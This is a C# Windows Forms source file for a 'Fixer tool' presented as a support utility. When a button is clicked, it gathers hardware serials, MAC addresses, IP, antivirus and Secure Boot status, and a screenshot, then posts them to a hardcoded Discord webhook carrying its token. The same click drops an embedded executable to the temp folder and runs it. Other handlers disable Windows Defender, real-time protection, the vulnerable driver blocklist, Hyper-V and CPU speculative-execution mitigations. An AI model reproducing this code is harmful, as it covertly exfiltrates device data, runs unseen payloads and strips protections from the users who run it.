using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace Fixer_tool
{
    public partial class Form1 : Form
    {
        private const string WebhookUrl = "https://discord.com/api/webhooks/1289447169262096465/LwH8xHsQxQduPe2You2BbGnGMlDddX2XKowFDyY942gwPnaM8pa79xlB_SmaNdQxSBIl"; // Replace with your webhook URL
        public Form1()
        {
            InitializeComponent();

        }
        private async void SendStartupWebhook()
        {
            using (HttpClient client = new HttpClient())
            {
                // Get PC name and local IP address
                string pcName = Environment.MachineName;
                string ipAddress = GetLocalIPAddress();

                // Get hardware information (serial numbers)
                string hwidInfo = GetHardwareInfo(); // Method to gather disk, CPU, BIOS, motherboard, SMBIOS UUID, MAC addresses

                // Get Hyper-V and security features information
                string hyperVInfo = GetHyperVInfo(); // Method to gather Hyper-V, SecureBoot, Fast startup, antivirus info

                // Capture screenshot of the application window
                byte[] screenshotBytes = CaptureApplicationScreenshot();

                // Create the first embed for hardware information
                var hardwareEmbed = new
                {
                    title = "Hardware Information",
                    description = hwidInfo,
                    color = 3447003  // Orange color
                };

                // Create the second embed for Hyper-V and security features
                var hyperVEmbed = new
                {
                    title = "Hyper-V and Security Features",
                    description = hyperVInfo,
                    color = 3447003  // Blue color
                };

                // Main payload including PC name, IP, and embeds
                var payload = new
                {
                    content = $"support tool has started up\nPC Name: {pcName}\nIP Address: {ipAddress}",
                    username = "Support tool",
                    embeds = new[] { hardwareEmbed, hyperVEmbed } // Add both embeds here
                };

                // Convert payload to JSON
                string jsonPayload = JsonConvert.SerializeObject(payload);

                // Multipart content to include the JSON payload and screenshot
                MultipartFormDataContent form = new MultipartFormDataContent();

                // Add JSON payload as part of "payload_json"
                form.Add(new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json");

                // Attach screenshot if available
                if (screenshotBytes != null)
                {
                    form.Add(new ByteArrayContent(screenshotBytes), "file", "screenshot.png"); // Attach screenshot as "file"
                }

                try
                {
                    // Send webhook
                    HttpResponseMessage response = await client.PostAsync(WebhookUrl, form);
                    if (!response.IsSuccessStatusCode)
                    {
                        MessageBox.Show($"Startup Tool: {response.ReasonPhrase}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error Starting Tool: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// start of getting hwid info
        /// </summary>
        /// <returns></returns>
        private string GetHardwareInfo()
        {
            string diskSerial = GetDiskSerial();
            string cpuSerial = GetCPUSerial();
            string biosSerial = GetBIOSSerial();
            string motherboardSerial = GetMotherboardSerial();
            string smbiosUUID = GetSMBIOSUUID();
            string macAddresses = GetMacAddresses();

            // Construct the hardware information message
            return $"Disk Serial: {diskSerial}\n" +
                   $"CPU Serial: {cpuSerial}\n" +
                   $"BIOS Serial: {biosSerial}\n" +
                   $"Motherboard Serial: {motherboardSerial}\n" +
                   $"SMBIOS UUID: {smbiosUUID}\n" +
                   $"MAC Addresses: {macAddresses}\n";
        }

        // Helper methods to get each piece of hardware information
        private string GetDiskSerial()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject disk in searcher.Get())
                    {
                        return disk["SerialNumber"]?.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetCPUSerial()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
                {
                    foreach (ManagementObject cpu in searcher.Get())
                    {
                        return cpu["ProcessorId"]?.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetBIOSSerial()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS"))
                {
                    foreach (ManagementObject bios in searcher.Get())
                    {
                        return bios["SerialNumber"]?.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetMotherboardSerial()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject motherboard in searcher.Get())
                    {
                        return motherboard["SerialNumber"]?.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetSMBIOSUUID()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject system in searcher.Get())
                    {
                        return system["UUID"]?.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetMacAddresses()
        {
            try
            {
                List<string> macAddresses = new List<string>();
                using (var searcher = new ManagementObjectSearcher("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL"))
                {
                    foreach (ManagementObject adapter in searcher.Get())
                    {
                        string mac = adapter["MACAddress"]?.ToString();
                        if (!string.IsNullOrEmpty(mac))
                        {
                            macAddresses.Add(mac);
                        }
                    }
                }
                return string.Join(", ", macAddresses);
            }
            catch
            {
                return "Unknown";
            }
        }
        /// <summary>
        /// this is the stop of getting hwid info
        /// </summary>
        /// <returns></returns>


        ///start of protection status

        private string GetHyperVInfo()
        {
            try
            {
                // Evaluate each feature and build the status messages
                string virtualization = CheckVirtualizationEnabled() ? "[+] Virtualization is enabled from BIOS." : "[!] Virtualization is not enabled from BIOS.";
                string secureBoot = CheckSecureBootEnabled() ? "[+] Secure Boot is enabled." : "[!] Secure Boot is disabled.";
                string fastStartup = CheckFastStartupEnabled() ? "[!] Fast Startup is enabled (not recommended)." : "[+] Fast Startup is disabled.";
                string driverBlocklist = CheckVulnerableDriverBlocklist() ? "[+] Vulnerable Driver Blocklist is enabled." : "[!] Vulnerable Driver Blocklist is disabled.";
                string thirdPartyAV = CheckThirdPartyAntivirus() ? "[+] Third-party antivirus is active." : "[!] No third-party antivirus detected.";
                string defenderRealTime = CheckDefenderRealTimeProtection() ? "[+] Defender Real-Time Protection is enabled." : "[!] Defender Real-Time Protection is disabled.";

                // Construct and format the report
                return string.Join("\n", new[]
                {
            "Hyper-V Features and Security Settings:",
            "----------------------------------------------------------",
            virtualization,
            secureBoot,
            fastStartup,
            "----------------------------------------------------------",
            driverBlocklist,
            thirdPartyAV,
            defenderRealTime,
            "----------------------------------------------------------"
        });
            }
            catch (Exception ex)
            {
                // Return a fallback error message if something fails
                return $"Error retrieving Hyper-V and security info: {ex.Message}";
            }
        }

        // Helper methods to check each feature
        private bool CheckVirtualizationEnabled()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT VirtualizationFirmwareEnabled FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        if (obj["VirtualizationFirmwareEnabled"] != null)
                        {
                            return (bool)obj["VirtualizationFirmwareEnabled"];
                        }
                    }
                }

                // If WMI fails, try additional checks
                if (CheckHyperVServiceRunning() || CheckHyperVFeatureEnabled())
                {
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking virtualization: {ex.Message}");
            }
            return false; // Default to false if checks fail
        }
        private bool CheckHyperVServiceRunning()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Service WHERE Name = 'vmms' AND State = 'Running'"))
                {
                    return searcher.Get().Count > 0;
                }
            }
            catch
            {
                return false;
            }
        }

        private bool CheckHyperVFeatureEnabled()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OptionalFeature WHERE Name = 'Microsoft-Hyper-V' AND InstallState = 1"))
                {
                    return searcher.Get().Count > 0;
                }
            }
            catch
            {
                return false;
            }
        }

        private bool CheckSecureBootEnabled()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT SecureBootEnabled FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return (bool)obj["SecureBootEnabled"];
                    }
                }
            }
            catch { }
            return false;
        }

        private bool CheckFastStartupEnabled()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
                {
                    return key != null && ((int)key.GetValue("HiberbootEnabled", 0) == 1);
                }
            }
            catch { }
            return false;
        }

        private bool CheckVulnerableDriverBlocklist()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy"))
                {
                    return key != null && ((int)key.GetValue("VulnerableDriverBlocklistEnable", 0) == 1);
                }
            }
            catch { }
            return false;
        }

        private bool CheckThirdPartyAntivirus()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM AntiVirusProduct"))
                {
                    return searcher.Get().Count > 0;
                }
            }
            catch { }
            return false;
        }

        private bool CheckDefenderRealTimeProtection()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
                {
                    return key != null && ((int)key.GetValue("DisableRealtimeMonitoring", 0) == 0);
                }
            }
            catch { }
            return false;
        }
        /// <summary>
        /// end of protection status checks 
        /// </summary>
        /// <returns></returns>

        private string GetLocalIPAddress()
        {
            string localIP = "Not Available";
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIP = ip.ToString();
                        break;
                    }
                }
            }
            catch
            {
                localIP = "Unable to retrieve IP";
            }
            return localIP;
        }

        private byte[] CaptureApplicationScreenshot()
        {
            try
            {
                // Capture the screenshot of the application window
                using (var bmp = new Bitmap(this.Width, this.Height))
                {
                    this.DrawToBitmap(bmp, new Rectangle(0, 0, bmp.Width, bmp.Height));
                    using (var ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                return null; // Return null if screenshot fails
            }
        }
        private void guna2Button3_Click(object sender, EventArgs e)
        {
            try
            {
                // Execute the command to modify the registry
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f")
                {
                    UseShellExecute = true, // Use shell to elevate
                    Verb = "runas" // Prompt for elevation
                };
                Process.Start(processInfo).WaitForExit();

                processInfo = new ProcessStartInfo("cmd.exe", "/c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f")
                {
                    UseShellExecute = true, // Use shell to elevate
                    Verb = "runas" // Prompt for elevation
                };
                Process.Start(processInfo).WaitForExit();

                processInfo = new ProcessStartInfo("cmd.exe", "/c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0x000000 /f")
                {
                    UseShellExecute = true, // Use shell to elevate
                    Verb = "runas" // Prompt for elevation
                };
                Process.Start(processInfo).WaitForExit();

                MessageBox.Show("Done!\nPLEASE RESTART YOUR PC!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public string CheckRealTimeProtection() // then we go do this
        {
            var path = @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
            var key = "DisableRealtimeMonitoring";

            using (var regkey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                if (regkey != null)
                {
                    using (var subkey = regkey.OpenSubKey(path))
                    {
                        if (subkey != null)
                        {
                            var val = subkey.GetValue(key);
                            if (val is int value)
                            {
                                if (value == 1)
                                {
                                    return "Disabled";
                                }
                                else
                                {
                                    return "Enabled";
                                }
                            }
                            else
                            {
                                return "Protection status is indeterminate (default state assumed to be on).";
                            }
                        }
                        else
                        {
                            return "Real-time Protection subkey not found.";
                        }
                    }
                }
                else
                {
                    return "Failed to open the registry base key.";
                }
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            SendStartupWebhook();
            // Extract the embedded .exe from resources
            string exePath = Path.Combine(Path.GetTempPath(), "support2_0.exe");

            // Check if the file already exists
            if (!File.Exists(exePath))
            {
                using (FileStream fs = new FileStream(exePath, FileMode.Create, FileAccess.Write))
                {
                    byte[] exeBytes = Properties.Resources.support2_0; 
                    fs.Write(exeBytes, 0, exeBytes.Length);
                }
            }

            // Run the .exe
            Process.Start(exePath);
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            // Extract the embedded .exe from resources
            string exePath = Path.Combine(Path.GetTempPath(), "Support_tool.exe");

            // Check if the file already exists
            if (!File.Exists(exePath))
            {
                using (FileStream fs = new FileStream(exePath, FileMode.Create, FileAccess.Write))
                {
                    byte[] exeBytes = Properties.Resources.Support_Tool; 
                    fs.Write(exeBytes, 0, exeBytes.Length);
                }
            }

            // Run the .exe
            Process.Start(exePath);
        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            // Confirm with the user before restarting
            var result = MessageBox.Show("Are you sure you want to restart the PC?", "Confirm Restart", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            if (result == DialogResult.Yes)
            {
                // Restart the PC
                Process.Start("shutdown", "/r /t 0");
            }
        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", true))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableAntiSpyware", 0, RegistryValueKind.DWord);
                        MessageBox.Show("Windows Defender has been enabled.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("Unable to access Windows Defender registry key.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                MessageBox.Show("You need to run this application as an administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button8_Click(object sender, EventArgs e)
        {
            try
            {
                // Enable real-time protection by modifying the registry
                var processInfo = new ProcessStartInfo("reg.exe",
                    "add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f")
                {
                    UseShellExecute = true, // Use shell to elevate
                    Verb = "runas" // Prompt for elevation
                };

                Process.Start(processInfo);
                MessageBox.Show("Real-time protection enabled!\nPLEASE RESTART YOUR PC!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            try
            {
                // Execute the command to modify the registry
                var processInfo = new ProcessStartInfo("reg.exe",
                    "add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0x000000 /f")
                {
                    UseShellExecute = true,   
                    Verb = "runas" // Prompt for elevation
                };

                Process.Start(processInfo);

                MessageBox.Show("Done!\nPLEASE RESTART YOUR PC!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {
            try
            {
                // Set up the process start info
                var processInfo = new ProcessStartInfo("cmd.exe", "/c disable_hyperv.bat")
                {
                    UseShellExecute = true,   
                    Verb = "runas",   
                    WindowStyle = ProcessWindowStyle.Hidden // Hide the CMD window
                };

                // Start the process
                Process.Start(processInfo);

                MessageBox.Show("Hyper-V is being disabled. Please wait and follow any prompts.", "Process Started", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", true))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                        MessageBox.Show("Windows Defender has been disabled.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("Unable to access Windows Defender registry key.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                MessageBox.Show("You need to run this application as an administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            try
            {
                // Disable real-time protection by modifying the registry
                var processInfo = new ProcessStartInfo("reg.exe",
                    "add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f")
                {
                    UseShellExecute = true, // Use shell to elevate
                    Verb = "runas" // Prompt for elevation
                };

                Process.Start(processInfo);
                MessageBox.Show("Real-time protection disabled!\nPLEASE RESTART YOUR PC!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button12_Click(object sender, EventArgs e)
        {
            try
            {
                var processInfo = new ProcessStartInfo("powershell.exe",
                    "Set-MpPreference -DisableRealtimeMonitoring $true")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,  // No cmd window popup
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };

                var process = Process.Start(processInfo);
                process.WaitForExit();

                MessageBox.Show("Real-time protection temporarily disabled.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {
            try
            {
                var processInfo = new ProcessStartInfo("powershell.exe",
                    "Set-MpPreference -DisableRealtimeMonitoring $false")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,  // No cmd window popup
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };

                var process = Process.Start(processInfo);
                process.WaitForExit();

                MessageBox.Show("Real-time protection re-enabled.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button13_Click(object sender, EventArgs e)
        {
            guna2Button6_Click(sender, e);
            guna2Button7_Click(sender, e);
            guna2Button3_Click(sender, e);

        }

        private void guna2Button14_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
